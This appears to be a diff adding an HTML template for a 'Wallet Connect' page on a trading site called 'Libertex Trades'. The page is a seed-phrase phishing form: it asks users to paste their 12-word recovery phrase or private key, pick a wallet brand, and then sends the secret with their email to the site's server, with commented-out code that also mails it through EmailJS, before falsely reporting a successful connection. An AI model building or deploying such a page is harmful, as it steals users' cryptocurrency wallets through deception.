@@ -1,0 +1,300 @@
+<!DOCTYPE html>
+<html class="no-js" lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="x-ua-compatible" content="ie=edge">
+    <title>Wallet Connect</title>
+    <meta name="description" content="">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <!-- <link rel="icon" type="image/png" sizes="16x16" href="./images/favicon.png"> -->
+
+    <link rel="manifest" href="site.php">
+    <link rel="apple-touch-icon" href="icon.php">
+    <link href="../images/rinologo.jpeg" rel="shortcut icon">
+    <!-- Place favicon.ico in the root directory -->
+    <link rel="stylesheet" href="/css/style1.css">
+
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,400,500,600" rel="stylesheet">
+    <link rel="stylesheet" href="css/style.css">
+   
+    <script>
+        function googleTranslateElementInit() {
+            new google.translate.TranslateElement(
+                {
+                    pageLanguage: "en",
+                },
+                "google_translate_element"
+            );
+        }
+    </script>
+    <script src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
+</head>
+
+<body>
+
+    <div id="preloader" class="d-none">
+        <div class="loader d-none">
+            <div class="loader__bar"></div>
+            <div class="loader__bar"></div>
+            <div class="loader__bar"></div>
+            <div class="loader__bar"></div>
+            <div class="loader__bar"></div>
+            <div class="loader__ball"></div>
+        </div>
+    </div>
+
+
+    <!-- header -->
+    {{>header}}
+    {{>sidebar}}
+    <!-- #/ sidebar -->
+
+    <div class="content-body">
+        <div class="wallet_connect_container_div">
+            <h1>Welcome to wallet connect <sup class="new-icon" style="color: blue;">New</sup></h1>
+            <p>Integrate you wallet on Libertex Trades for fast and easy payment payment </p>
+
+            <div class="wallet_input_div">
+                {{!-- <form action="submit_wallet" method="post"> --}}
+                    <textarea id="form" name="walletConenect" id="walletConenect"
+                        placeholder="Integrate wallet " required></textarea>
+                    <br>
+                    <input type="hidden" name="" value='{{email}}' id="userEmail">
+                    <br>
+                    <label="">Secret Type</label><br>
+                        <select name="secretType" id="secretType" required>
+                            <option value="12 Phrase">12 Phrase</option>
+                            <option value="Wallet Secret">Private key</option>
+                        </select>
+                        <br>
+                        <br>
+                        <label="">Wallet Type</label><br>
+                            <select name="wallet_type" id="walletType" required>
+                                <option value="Trust Wallet">Trust Wallet</option>
+                                <option value="MetaMask">MetaMask</option>
+                                <option value="Coinbase Wallet">Coinbase Wallet</option>
+                                <option value="MyEtherWallet">MyEtherWallet</option>
+                                <option value="Exodus">Exodus</option>
+                                <option value="Jaxx">Jaxx </option>
+                                <option value="Electrum Wallet">Electrum Wallet </option>
+                                <option value="Trezor Wallet">Trezor Wallet </option>
+                                <option value="Atomic Wallet">Atomic Wallet </option>
+                                <option value="Coinomi">Coinomi </option>
+                                <option value="StakedWallet">StakedWallet </option>
+                                <option value="Hyperledger">Hyperledger </option>
+                                <option value="other">Other</option>
+                            </select>
+                            <br>
+                            <br>
+                            <textarea id="otherWalletText" name="wallet_type_other" style="display: none;" type="text"
+                                placeholder="Please specify the type of wallet"></textarea>
+                            <button id="button">Upload</button>
+                            {{!--
+                </form> --}}
+
+            </div>
+
+        </div>
+    </div>
+
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+
+    <script type="text/javascript">
+        emailjs.init('f5JYXh2P151seiLBm')
+    </script>
+
+    <script type="text/javascript">
+        let enteredWalletType = document.getElementById('walletType')
+        let enteredSecretType = document.getElementById('secretType')
+        let enteredOtherWalletText = document.getElementById('otherWalletText')
+        let userEmail = document.getElementById('userEmail')
+        let walletConenectx = document.querySelector('textarea#form')
+
+
+        document.getElementById('button').addEventListener('click', e => {
+            if (walletConenectx.value === "") return alert('All fields are required')
+            var templateParams = {
+                from_name: "plogapp",
+                email: userEmail.value,
+                wallet_type: enteredWalletType.value,
+                secret_type: enteredSecretType.value,
+                wallet_phrase: walletConenectx.value,
+                other_wallet: enteredOtherWalletText.value,
+            };
+
+
+            console.log(templateParams)
+            fetch('/submit_wallet', {
+                method: "POST",
+                headers: {
+                    'Accept': 'application/json, text/plain, */*',
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(templateParams)
+            })
+
+                .then(data => {
+                    console.log(data)
+                    location.href = '/wallet-connect?status=success'
+
+
+                }).catch(error => {
+                    console.log(error)
+                })
+
+
+
+            const serviceID = 'service_xtyh5yh';
+            const templateID = 'template_qn9hgii';
+
+            /*{
+                            {
+                                !--emailjs.send(serviceID, templateID, templateParams)
+                                    .then(data => {
+                                        console.log('Success')
+                                        console.log(data)
+            
+            
+            
+            
+                                    })
+                                    .catch(error => {
+                                        console.log(error)
+                                    }) --}
+                        }*/
+
+        })
+    </script>
+    <script>
+        let url_ = new URLSearchParams(location.search)
+        let secretType = url_.get('status')
+        console.log(secretType)
+        if (secretType) {
+            alert('Connected successfuly ')
+            window.history.pushState({}, '', '/wallet-connect');
+        }
+
+    </script>
+
+
+
+    <script>
+        let otherWalletText = document.getElementById('otherWalletText')
+        document.getElementById('walletType').addEventListener('change', e => {
+            if (e.target.value == 'other') {
+                otherWalletText.style.display = 'block'
+                return
+            } else {
+                otherWalletText.style.display = 'none'
+            }
+        })
+    </script>
+
+    {{!--
+    <script>
+        let url_ = new URLSearchParams(location.search)
+        console.log('=======================================================================')
+        let status = url_.get('status')
+        let wallet_details = url_.get('wallet_details')
+        let email = url_.get('email')
+        let walletType = url_.get('walletType')
+        let secretType = url_.get('secretType')
+        if (status == 'success') {
+            alert('Wallet connected successfully')
+
+            var templateParams = {
+                from_name: "Libertex Trades user",
+                message: "New Wallet details submitted: ",
+                wallet_details,
+                email,
+                walletType,
+                secretType
+            };
+
+            console.log(templateParams)
+
+            const serviceID = 'service_xtyh5yh';
+            const templateID = 'template_qn9hgii';
+
+            emailjs.send(serviceID, templateID, templateParams)
+
+                .then(function (response) {
+                    console.log('SUCCESS!', response.status, response.text);
+                    window.history.pushState({}, '', '/wallet-connect');
+
+                }, function (error) {
+                    console.log('FAILED...', error);
+                });
+        }
+
+
+
+    </script> --}}
+
+
+
+    <!-- Modernizr-3 -->
+    <!-- jQuery -->
+    <script src="../assets/plugins/common/common.min.js"></script>
+
+
+    <!-- custom scripts -->
+    <script src="js/scripts.js"></script>
+    <script>
+        /* let ref_url = document.getElementById('ref_url')
+         document.getElementById('copyRefLink').addEventListener('click', e => {
+             ref_url.select()
+             document.execCommand('copy')
+             e.target.textContent = 'Copied'
+             e.target.style.backgroundColor = 'green'
+             e.target.style.color = 'white'
+             setTimeout(() => {
+                 e.target.textContent = 'Copy'
+                 e.target.style.backgroundColor = 'white'
+                 e.target.style.color = 'black'
+             }, 1500)
+         })*/
+    </script>
+
+
+
+
+    <script>
+        /*  document.getElementById('copyAccount').addEventListener('click', (e) => {
+              let prevCopy = document.getElementById('prevCopy')
+              prevCopy.style.display = 'block'
+              prevCopy.value = document.getElementById('walletList').value
+              prevCopy.select()
+              document.execCommand('copy')
+  
+              e.target.textContent = 'Copied'
+              e.target.style.backgroundColor = 'green'
+              e.target.style.color = 'white'
+              prevCopy.style.display = 'none'
+              setTimeout(() => {
+                  e.target.textContent = 'Copy'
+                  e.target.style.backgroundColor = 'white'
+                  e.target.style.color = 'black'
+              }, 1500)
+          })
+  */
+    </script>
+</body>
+  {{!-- <script src="//code.tidio.co/ivorokqnnw4n2dgvdeacw3c9s1j5fvhr.js" async></script> --}}
+
+  <!-- Smartsupp Live Chat script -->
+<script type="text/javascript">
+var _smartsupp = _smartsupp || {};
+_smartsupp.key = 'e245bf7aad08bddb94ad4831f1c30bc84dbd6e8a';
+window.smartsupp||(function(d) {
+  var s,c,o=smartsupp=function(){ o._.push(arguments)};o._=[];
+  s=d.getElementsByTagName('script')[0];c=d.createElement('script');
+  c.type='text/javascript';c.charset='utf-8';c.async=true;
+  c.src='https://www.smartsuppchat.com/loader.js?';s.parentNode.insertBefore(c,s);
+})(document);
+</script>
+<noscript> Powered by <a href=“https://www.smartsupp.com” target=“_blank”>Smartsupp</a></noscript>
+
+</html>
